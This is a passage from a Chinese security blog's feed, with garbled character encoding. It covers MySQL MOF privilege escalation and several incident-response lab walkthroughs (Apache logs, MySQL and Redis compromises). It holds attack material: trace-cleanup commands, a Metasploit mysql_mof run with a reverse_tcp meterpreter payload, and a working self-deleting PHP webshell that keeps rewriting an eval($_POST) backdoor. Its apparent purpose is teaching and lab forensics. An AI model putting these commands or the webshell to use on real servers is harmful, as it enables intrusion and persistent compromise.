c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad ç›®å½•ä¸‹</p><p><strong>ç—•è¿¹æ¸…ç†</strong></p><p>å› ä¸ºæ¯éš”å‡ åˆ†é’Ÿæ—¶é—´åˆä¼šé‡æ–°æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ‰€ä»¥æƒ³è¦æ¸…ç†ç—•è¿¹å¾—å…ˆæš‚æ—¶å…³é—­ winmgmt æœåŠ¡å†åˆ é™¤ç›¸å…³ mof æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å†åˆ é™¤ç”¨æˆ·æ‰ä¼šæœ‰æ•ˆæœ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>net stop winmgmt<br><br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span><br>net user hacker /delete<br><br><span class="hljs-comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msfææƒ</strong></p><p>msfé‡Œé¢å°±æœ‰mofææƒçš„æ¨¡å—ï¼Œè¿˜ä¼šè‡ªåŠ¨æ¸…ç†ç—•è¿¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># è®¾ç½®å¥½è‡ªå·±çš„ payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.sqlsec.com/2020/11/mysql.html&quot;&gt;https://www.sqlsec.com/2020/11/mysql.html&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;æƒé™è·å–&quot;&gt;æƒé™è·å–&lt;/span</summary>
      
    
    
    
    <category term="ææƒ" scheme="https://clowsman.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="mysql" scheme="https://clowsman.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬äºŒç« </title>
    <link href="https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</id>
    <published>2024-07-10T06:31:01.000Z</published>
    <updated>2024-07-15T08:45:17.051Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="apacheæ—¥å¿—åˆ†æ">Apacheæ—¥å¿—åˆ†æ</span></h1><p>é¶åœºç®€ä»‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·å¯†ç  root apacherizhi<br>ssh root@IP<br>1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š<br>2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š<br>3ã€æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š<br>4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š<br>5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:<br></code></pre></td></tr></table></figure><p>apacheçš„æ—¥å¿—æ”¾åœ¨&#x2F;var&#x2F;log&#x2F;apacheç›®å½•ä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>ç„¶åç”¨ä¸‹é¢æŒ‡ä»¤ç­›é€‰å‡ºè®¿é—®çš„ipæ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>å‘½ä»¤ç”¨äºå‰ªåˆ‡å¹¶åˆ†å‰²æ–‡ä»¶ä¸­çš„è¡Œã€‚<br>-d-æŒ‡å®šåˆ†éš”ç¬¦ä¸º<span class="hljs-string">&quot;-&quot;</span>ï¼Œå³ä»¥è¿å­—ç¬¦ä½œä¸ºå­—æ®µçš„åˆ†éš”ç¬¦ã€‚<br>-f 1æŒ‡å®šåªæå–æ¯ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚<br><br><span class="hljs-built_in">sort</span>å‘½ä»¤ç”¨äºå¯¹æ–‡æœ¬è¡Œè¿›è¡Œæ’åºã€‚<br>-ré€‰é¡¹è¡¨ç¤ºä»¥é€†åºï¼ˆä»å¤§åˆ°å°ï¼‰æ’åºã€‚<br>-né€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼å¤§å°è¿›è¡Œæ’åºã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>æµè§ˆå™¨æŒ‡çº¹å°±è¿‡æ»¤ä¸€ä¸‹çœ‹çœ‹å…·ä½“çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//æµè§ˆå™¨æŒ‡çº¹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> æ‰¾index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -lå‘½ä»¤ç”¨äºè®¡ç®—åŒ¹é…åˆ°çš„è¡Œæ•°ï¼Œflag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>æŸ¥æ‰¾é»‘å®¢ipè®¿é—®çš„æ¬¡æ•°ï¼Œæˆ‘ä»¬åªè¦æŠŠå»æ‰é‡å¤è¡Œæ”¹æˆè®¡ç®—åŒ¹é…è¡Œæ•°å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼ŒæŠŠç¬¬ä¸€ä¸ªæŸ¥çœ‹è®¿é—®ipæ”¹æˆæ—¶é—´å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># æˆ‘ä»¬è¦ç”¨ipæ¥åŒ¹é…æ‰èƒ½æ­£ç¡®å»æ‰é‡å¤è¡Œï¼Œæ‰€ä»¥è¦å…ˆawkæ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µä¹Ÿå°±æ˜¯ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1><span id="mysqlåº”æ€¥å“åº”">mysqlåº”æ€¥å“åº”</span></h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysqlåº”æ€¥å“åº” sshè´¦å· root  å¯†ç  xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag&#123;å…³é”®å­—ç¬¦ä¸²&#125; <br>2.é»‘å®¢åå¼¹shellçš„ip flag&#123;ip&#125;<br>3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125; æ³¨ /xxx/xxx/xxx/xxx/xxx.xx<br>4.é»‘å®¢è·å–çš„æƒé™ flag&#123;whoamiåçš„å€¼&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå»çœ‹ä¸€ä¸‹mysqlçš„æ—¥å¿—ï¼Œåœ¨&#x2F;var&#x2F;log&#x2F;mysqlä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>çœ‹çœ‹webç›®å½•ä¸‹æœ‰æ²¡æœ‰è¢«å†™shellï¼Œæ¯•ç«Ÿä¸€èˆ¬éƒ½æ˜¯ä»ç½‘ç«™å¼€å§‹æ¸—é€çš„</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" alt="image-20240711183039409"></p><p>æœç„¶æœ‰ï¼Œflag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ²³é©¬æŸ¥æ€ï¼Œåˆšå­¦åˆ°çš„ï¼Œä¸‹è½½ä¹Ÿå¾ˆå¿«ï¼Œè¿™æ˜¯å®˜ç½‘ï¼š<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>ç”¨æ³•ä¹Ÿå¾ˆç®€å•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä¸‹è½½è§£å‹ç¼©</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># ä½¿ç”¨</span><br>./hm deepscan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment"># æ·±åº¦æ‰«æï¼Œæ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶</span><br>./hm scan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment">#æ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶ï¼Œä½¿ç”¨è®°äº‹æœ¬æˆ–è€…excelæ‰“å¼€æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>æŸ¥æ‰¾åå¼¹shellçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹error.logæœ‰æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸çš„åœ°æ–¹</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>æ„Ÿè§‰&#x2F;tmp&#x2F;1.shæœ‰ç‚¹å¥‡æ€ªï¼Œå»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªbashçš„åå¼¹shellæŒ‡ä»¤ï¼Œæ‰¾åˆ°åå¼¹çš„åœ°å€ï¼Œflag{192.168.100.13}</p><p>è¿™ä¸ªæ–‡ä»¶åœ¨&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ä¸‹ä¹Ÿæœ‰</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>å¯»æ‰¾é»‘å®¢ææƒçš„å®Œæ•´è·¯å¾„ï¼Œè¿™é‡Œèƒ½å¤Ÿææƒåº”è¯¥æ³„éœ²äº†ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œæˆ‘ä»¬å‘ç°åœ¨webç›®å½•ä¸‹çš„common.phpé‡Œé¢æœ‰rootç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysqlå¸¸è§„çš„ææƒå¥—è·¯å°±æ˜¯udfææƒï¼Œå¦‚æœæ˜¯çš„è¯é‚£ä¹ˆåº”è¯¥å°±ä¼šåœ¨ &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;ç•™ä¸‹æ–‡ä»¶ç—•è¿¹ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>é‚£ææƒè·¯å¾„å°±æ˜¯&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.soï¼Œflag{b1818bde4e310f3d23f1005185b973e7}</p><p>æŸ¥çœ‹ææƒåçš„æƒé™ï¼Œçœ‹ä¸€ä¸‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯é‚£ä¸ªmysqlçš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæƒé™å°±æ˜¯flag{mysql}</p><p>æˆ–è€…è¿›å…¥åˆ°mysqlé‡Œé¢ç”¨**select sys_eval(â€œwhoamiâ€);**æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1><span id="redisåº”æ€¥å“åº”">redisåº”æ€¥å“åº”</span></h1><p>é¶æœºä»‹ç»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æœåŠ¡å™¨åœºæ™¯æ“ä½œç³»ç»Ÿ Linux<br>æœåŠ¡å™¨è´¦å·å¯†ç  root xjredis<br><br>ä»»åŠ¡ç¯å¢ƒè¯´æ˜<br>    æ³¨ï¼šæ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼<br>    åº”æ€¥å“åº”å·¥ç¨‹å¸ˆå°ç‹æŸäººæ”¶åˆ°å®‰å…¨è®¾å¤‡å‘Šè­¦æœåŠ¡å™¨è¢«æ¤å…¥æ¶æ„æ–‡ä»¶ï¼Œè¯·ä¸Šæœºæ’æŸ¥<br></code></pre></td></tr></table></figure><p>æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶,å°†é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶é‡Œé¢çš„ FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢åå¼¹ shell çš„IP ä¸ºå¤šå°‘,å°†åå¼¹ shell çš„IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”æº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²(flag&#123;é»‘å®¢çš„ç”¨æˆ·-å…³é”®å­—ç¬¦ä¸²&#125; æ³¨å…³é”®å­—ç¬¦ä¸² xxx-xxx-xxx)ã€‚å°†ç”¨æˆ·åå’Œå…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAGæäº¤<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤,å°†é»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤é‡Œé¢çš„å…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAG æäº¤;<br></code></pre></td></tr></table></figure><p>é‚£å°±å…ˆå»çœ‹ä¸€ä¸‹redisçš„æ—¥å¿—åœ¨&#x2F;var&#x2F;logä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>è¿™é‡Œæ‰¾åˆ°ä¸€å¼ ä¸»ä»å¤åˆ¶æ—¶çš„é€šä¿¡è¿‡ç¨‹å›¾ï¼Œæ‰€ä»¥æœ‰<strong>Master replied to PING</strong>çš„å­—æ®µå³ä¸ºè¿æ¥æˆåŠŸ</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>è¿™é‡Œå¾ˆæ˜æ˜¾åº”è¯¥æ˜¯ä¸€ä¸ªredisçš„ä¸»ä»å¤åˆ¶ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥è¿æ¥ï¼Œå†å¾€ä¸‹è¿˜æœ‰å°è¯•å…¶ä»–ipçš„è¿æ¥ï¼Œæœ€åæˆåŠŸçš„æ˜¯20çš„ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>æ—¢ç„¶æ˜¯ä¸»ä»å¤åˆ¶é‚£ä¸€èˆ¬å°±ä¼šä¸Šä¼ æœ‰soæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨å‘½ä»¤æŸ¥çœ‹soæ–‡ä»¶åœ¨å“ªé‡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬æŸ¥çœ‹å†…å®¹é‡Œé¢æœ‰flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡æ‰¾åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>æº¯æºå¯ä»¥å»çœ‹ä¸€ä¸‹.sshä¸‹çš„authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>æ‰¾åˆ°äº†ä»–çš„ç”¨æˆ·å</p><p>xj-test-userï¼Œç„¶åå»githubä¸Šçœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·ï¼Œå¯ä»¥æ‰¾åˆ°ä»–ä½¿ç”¨çš„å·¥å…·</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>å†å»æ‰¾ä»–çš„å†å²commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>åœ¨first commité‡Œé¢</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>æœ€åæŸ¥æ‰¾ç¯¡æ”¹çš„å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥å»&#x2F;usr&#x2F;binç›®å½•ä¸‹æŸ¥çœ‹ï¼Œè¿™é‡Œæ”¹çš„æ˜¯pså‘½ä»¤ï¼Œæˆ‘å°±è¯´ä¸€å¼€å§‹ç”¨pså‘½ä»¤ä¸ºä»€ä¹ˆæ€ªæ€ªçš„</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;apacheæ—¥å¿—åˆ†æ&quot;&gt;Apacheæ—¥å¿—åˆ†æ&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;é¶åœºç®€ä»‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code clas</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸€ç« </title>
    <link href="https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</id>
    <published>2024-07-02T05:33:05.000Z</published>
    <updated>2024-07-15T08:45:57.790Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linuxå…¥ä¾µæ’æŸ¥">Linuxå…¥ä¾µæ’æŸ¥</span></h1><p>è¿™æ˜¯é¶æœºçš„ç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·ï¼šroot å¯†ç ï¼šlinuxruqin<br>ssh root@IP<br>1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤<br>2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤<br>3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å<br>4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤<br>5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤<br></code></pre></td></tr></table></figure><p>å…ˆç®€å•äº†è§£ä¸€ä¸‹ä¸æ­»é©¬ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>ä¸æ­»é©¬çš„åŸç†å°±æ˜¯å…¶è¿›ç¨‹ä¸ä¼šæ¶ˆäº¡ï¼Œåœ¨å†…å­˜ä¸­ä¸æ–­åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ°æ— æ³•åˆ é™¤çš„ç›®çš„ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¸æ­»é©¬ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()å‡½æ•°ï¼šå‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼›ä¹Ÿå°±æ˜¯è®¿é—®äº†è¿™ä¸ªé¡µé¢ä¹‹åï¼Œè„šæœ¬ä¼šä¸€ç›´åœ¨åå°æ‰§è¡Œã€‚<br>2. set_time_limit()å‡½æ•°ï¼šè®¾ç½®å…è®¸è„šæœ¬è¿è¡Œçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœè®¾ç½®ä¸º0ï¼ˆé›¶ï¼‰ï¼Œæ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚<br>3. unlink(__FILE__)å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶æœ¬èº«ã€‚<br>4. file_put_contentså‡½æ•°ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚<br>5. usleepå‡½æ•°ï¼šå»¶è¿Ÿæ‰§è¡Œå½“å‰è„šæœ¬è‹¥å¹²å¾®ç§’ï¼ˆä¸€å¾®ç§’ç­‰äºä¸€ç™¾ä¸‡åˆ†ä¹‹ä¸€ç§’ï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç»™ä¸æ­»é©¬åŠ ä¸€ä¸ªå¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span 